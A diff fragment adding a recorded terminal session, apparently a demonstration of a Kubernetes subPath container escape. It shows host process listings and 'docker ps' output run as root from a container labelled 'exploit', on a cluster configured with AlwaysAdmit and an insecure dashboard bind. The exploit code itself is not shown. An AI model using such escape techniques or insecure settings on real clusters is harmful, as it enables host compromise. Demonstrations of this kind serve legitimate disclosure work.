+      "00:00:00 [bioset]\r\nroot        54     2  0 Mar17 ?        00:00:00 [bioset]\r\nroot        55     2  0 Mar17 ?        00:00:00 [bioset]\r\nroot        56     2  0 Mar17 ?        00:00:00 [bioset]\r\nroot        57     2  0 Mar17 ?        00:00:00 [bioset]\r\nroot        58     2  0 Mar17 ?        00:00:00 [bioset]\r\nroot        59     2  0 Mar17 ?        00:00:00 [bioset]\r\nroot        60     2  0 Mar17 ?        00:00:00 [bioset]\r\nroot        61     2  0 Mar17 ?        00:00:00 [bioset]\r\nroot        62     2  0 Mar17 ?        00:00:00 [bioset]\r\nroot        63     2  0 Mar17 ?        00:00:00 [bioset]\r\nroot        64     2  0 Mar17 ?        00:00:00 [bioset]\r\nroot        65     2  0 Mar17 ?        00:00:00 [bioset]\r\nroot        66     2  0 Mar17 ?        00:00:00 [bioset]\r\nroot        67     2  0 Mar17 ?        00:00:00 [bioset]\r\nroot        68     2  0 Mar17 ?        00:00:00 [bioset]\r\nroot        69     2  0 Mar17 ?        00:00:00 [bioset]\r\nroot        70     2  0 Mar17 ?        00:00:00 [bioset]\r\nroot        71     "
+    ],
+    [
+      0.000258,
+      "2  0 Mar17 ?        00:00:00 [bioset]\r\nroot        72     2  0 Mar17 ?        00:00:00 [bioset]\r\nroot        73     2  0 Mar17 ?        00:00:00 [bioset]\r\nroot        74     2  0 Mar17 ?        00:00:00 [scsi_eh_0]\r\nroot        75     2  0 Mar17 ?        00:00:00 [scsi_tmf_0]\r\nroot        76     2  0 Mar17 ?        00:00:00 [scsi_eh_1]\r\nroot        77     2  0 Mar17 ?        00:00:00 [scsi_tmf_1]\r\nroot        82     2  0 Mar17 ?        00:00:00 [ipv6_addrconf]\r\nroot        84     2  0 Mar17 ?        00:00:00 [bioset]\r\nroot        96     2  0 Mar17 ?        00:00:00 [deferwq]\r\nroot       248     2  0 Mar17 ?        00:00:00 [raid5wq]\r\nroot       279     2  0 Mar17 ?        00:00:00 [bioset]\r\nroot       302     2  0 Mar17 ?        00:00:01 [jbd2/xvda1-8]\r\nroot       303     2  0 Mar17 ?        00:00:00 [ext4-rsv-conver]\r\nroot       363     2  0 Mar17 ?        00:00:00 [kworker/0:1H]\r\nroot       388     1  0 Mar17 ?        00:08:21 /lib/systemd/systemd-journald\r\nroot       397     2  0 Mar17 ?        00:00:00 [i"
+    ],
+    [
+      6.6e-05,
+      "scsi_eh]\r\nroot       398     2  0 Mar17 ?        00:00:00 [kauditd]\r\nroot       401     2  0 Mar17 ?        00:00:00 [ib_addr]\r\nroot       405     2  0 Mar17 ?        00:00:00 [ib_mcast]\r\nroot       406     2  0 Mar17 ?        00:00:00 [ib_nl_sa_wq]\r\nroot       409     2  0 Mar17 ?        00:00:00 [ib_cm]\r\nroot       414     2  0 Mar17 ?        00:00:00 [iw_cm_wq]\r\nroot       416     2  0 Mar17 ?        00:00:00 [rdma_cm]\r\nroot       426     1  0 Mar17 ?        00:00:00 /sbin/lvmetad -f\r\nroot      1014     1  0 Mar17 ?        00:00:00 /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhc\r\nroot      1229     1  0 Mar17 ?        00:00:02 /usr/bin/lxcfs /var/lib/lxcfs/\r\nroot      1231     1  0 Mar17 ?        00:00:00 /lib/systemd/systemd-logind\r\nroot      1235     1  0 Mar17 ?        00:01:20 /usr/lib/accountsservice/accounts-daemon\r\nroot      1237     1  0 Mar17 ?        00:07:10 /usr/local/bin/kube-proxy --cluster-cidr=10.2.0.0/16 --master=ht\r\nroot      1241     1  0 Mar17 ?        00:00:07 /sbin/is"
+    ],
+    [
+      4.6e-05,
+      "csid\r\nroot      1242     1  0 Mar17 ?        00:00:37 /sbin/iscsid\r\nsyslog    1248     1  0 Mar17 ?        00:02:17 /usr/sbin/rsyslogd -n\r\nroot      1257     1  1 Mar17 ?        01:27:33 /usr/local/bin/kubelet --allow-privileged=true --cluster-dns=10.\r\nmessage+  1261     1  0 Mar17 ?        00:00:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopi\r\nroot      1268     1  0 Mar17 ?        00:00:00 /usr/sbin/sshd -D\r\nroot      1271     1  0 Mar17 ?        00:18:14 /usr/bin/dockerd -H fd:// --ip-masq=false --iptables=false --log\r\nroot      1279     1  0 Mar17 ?        00:00:00 /usr/sbin/cron -f\r\nroot      1288     1  0 Mar17 ?        00:00:00 /usr/sbin/acpid\r\ndaemon    1294     1  0 Mar17 ?        00:00:00 /usr/sbin/atd -f\r\nroot      1297     1  1 Mar17 ?        01:32:23 /usr/local/bin/kube-apiserver --admission-control=AlwaysAdmit --\r\nroot      1303     1  0 Mar17 ?        00:27:12 /usr/local/bin/kube-scheduler --master=http://10.1.0.10:8080 --v\r\nroot      1310     1  0 Mar17 ?        00:00:12 /u"
+    ],
+    [
+      0.000228,
+      "sr/lib/snapd/snapd\r\nroot      1320     1  0 Mar17 ?        00:00:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemon\r\nroot      1327     1  0 Mar17 ?        00:00:00 /usr/lib/policykit-1/polkitd --no-debug\r\nroot      1400     1  0 Mar17 tty1     00:00:00 /sbin/agetty --noclear tty1 linux\r\nroot      1407     1  0 Mar17 ttyS0    00:00:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220\r\nroot      1479  1271  0 Mar17 ?        00:04:10 containerd -l unix:///var/run/docker/libcontainerd/docker-contai\r\nroot      1517     1  0 Mar19 ?        00:45:35 /usr/local/bin/kube-controller-manager --address=0.0.0.0 --clust\r\nroot      1918  1479  0 Mar17 ?        00:00:00 containerd-shim 0f394f295b38d9080b1ef1e4a933cf348305d97a494dab06\r\nroot      1935  1918  0 Mar17 ?        00:00:00 /pause\r\nroot      2063  1479  0 Mar17 ?        00:00:00 containerd-shim a3c7cd6d8e0ebf603b431604ab7a1844f8ed0b651b231b10\r\nroot      2079  2063  0 Mar17 ?        00:01:22 /dashboard --insecure-bind-address=0.0.0.0 --apiserver"
+    ],
+    [
+      7.4e-05,
+      "-host=http\r\nroot      2511     2  0 09:20 ?        00:00:00 [kworker/0:0]\r\nsystemd+  4138     1  0 Mar17 ?        00:00:00 /lib/systemd/systemd-timesyncd\r\nroot      5781     1  0 Mar17 ?        00:00:01 /lib/systemd/systemd-udevd\r\nroot     10028     2  0 Mar17 ?        00:00:00 [xfsalloc]\r\nroot     10029     2  0 Mar17 ?        00:00:00 [xfs_mru_cache]\r\nroot     13418  1479  0 13:29 ?        00:00:00 containerd-shim 189cc4bef06ddc645865b0ccdf72130e99f000320e104a10\r\nroot     13435 13418  0 13:29 ?        00:00:00 /pause\r\nroot     13471     2  0 13:29 ?        00:00:00 [kworker/0:1]\r\nroot     13476     2  0 13:29 ?        00:00:00 [kworker/0:3]\r\nroot     13480     2  0 13:29 ?        00:00:00 [kworker/u30:2]\r\nroot     13516  1479  0 13:29 ?        00:00:00 containerd-shim 294d653161ac9e387b173c2cead5033c1e51800e6cea2811\r\nroot     13532 13516  0 13:29 ?        00:00:00 sleep infinity\r\nroot     13565  1479  0 13:29 ?        00:00:00 containerd-shim 3f055bd81ff8d971d8392704efc3d8194895373bca137819\r\nroot     13581 "
+    ],
+    [
+      0.00321,
+      "13565  0 13:29 ?        00:00:00 /bin/bash -c if [[ -f /status/done ]];then sleep infinity; else \r\nroot     13599 13581  0 13:29 ?        00:00:00 sleep infinity\r\nroot     13611  1479  0 13:29 ?        00:00:00 containerd-shim 3f055bd81ff8d971d8392704efc3d8194895373bca137819\r\nroot     13626 13611  0 13:29 pts/0    00:00:00 /bin/bash\r\nroot     13675 13626  0 13:30 pts/0    00:00:00 ps -ef\r\nroot     21224     2  0 Mar22 ?        00:00:01 [kworker/0:2]\r\nroot     21229     2  0 Mar22 ?        00:00:00 [kworker/u30:0]\r\nroot     23110     2  0 Mar22 ?        00:00:00 [kworker/u30:1]\r\n\u001b]0;root@subpath: /\u0007root@subpath:/# "
+    ],
+    [
+      1.750831,
+      "d"
+    ],
+    [
+      0.088284,
+      "o"
+    ],
+    [
+      0.088538,
+      "c"
+    ],
+    [
+      0.067344,
+      "k"
+    ],
+    [
+      0.090971,
+      "e"
+    ],
+    [
+      0.034609,
+      "r"
+    ],
+    [
+      0.077072,
+      " "
+    ],
+    [
+      0.035009,
+      "p"
+    ],
+    [
+      0.111808,
+      "s"
+    ],
+    [
+      0.09119,
+      "\r\n"
+    ],
+    [
+      0.845129,
+      "CONTAINER ID        IMAGE                                                                                                                         COMMAND                  CREATED             STATUS              PORTS               NAMES\r\n3f055bd81ff8        nginx@sha256:c4ee0ecb376636258447e1d8effb56c09c75fe7acf756bf7c13efadf38aa0aca                                                 \"/bin/bash -c 'if ...\"   44 seconds ago      Up 44 seconds                           k8s_exploit_subpath_default_3fb02fa6-2e9e-11e8-9d04-06d7638bd978_0\r\n294d653161ac        nginx@sha256:c4ee0ecb376636258447e1d8effb56c09c75fe7acf756bf7c13efadf38aa0aca                                                 \"/bin/bash -c 'cd ...\"   44 seconds ago      Up 44 seconds                           k8s_setup_subpath_default_3fb02fa6-2e9e-11e8-9d04-06d7638bd978_0\r\n189cc4bef06d        gcr.io/google_containers/pause-amd64:3.0                                                                                      \"/pause\"                 45 seconds ago     "
+    ],
+    [
+      7.4e-05,
+      " Up 45 seconds                           k8s_POD_subpath_default_3fb02fa6-2e9e-11e8-9d04-06d7638bd978_0\r\na3c7cd6d8e0e        gcr.io/google_containers/kubernetes-dashboard-amd64@sha256:2c4421ed80358a0ee97b44357b6cd6dc09be6ccc27dfe9d50c9bfc39a760e5fe   \"/dashboard --inse...\"   5 days ago          Up 5 days                               k8s_kubernetes-dashboard_kubernetes-dashboard-5b575fd4c-77fqr_kube-system_d60f089f-0a85-11e8-9462-06d7638bd978_3\r\n0f394f295b38        gcr.io/google_containers/pause-amd64:3.0                                                                                      \"/pause\"                 5 days ago          Up 5 days                               k8s_POD_kubernetes-dashboard-5b575fd4c-77fqr_kube-system_d60f089f-0a85-11e8-9462-06d7638bd978_1\r\n\u001b]0;root@subpath: /\u0007root@subpath:/# "
+    ]
+  ]
+}
